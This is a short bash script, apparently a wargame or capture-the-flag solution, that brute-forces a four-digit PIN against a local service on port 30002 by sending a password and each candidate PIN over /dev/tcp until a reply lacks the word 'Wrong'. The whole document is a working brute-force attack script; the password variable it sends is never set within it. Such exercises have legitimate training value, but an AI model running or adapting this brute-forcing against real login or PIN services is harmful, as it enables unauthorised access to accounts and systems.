#!/bin/bash

PORT=30002
echo "[*] Brute-force optimizado..."
for i in $(seq -w 0 9999); do
    RESP=$(timeout 1 bash -c 'echo "'"$PASS"' $1" >&3; cat <&3' _ "$i" 3<>/dev/tcp/localhost/$PORT 2>/dev/null)
    if [[ -n "$RESP" && "$RESP" != *"Wrong"* ]]; then
        echo -e "\n[✅] PIN: $i | $RESP"; exit 0
    fi

done
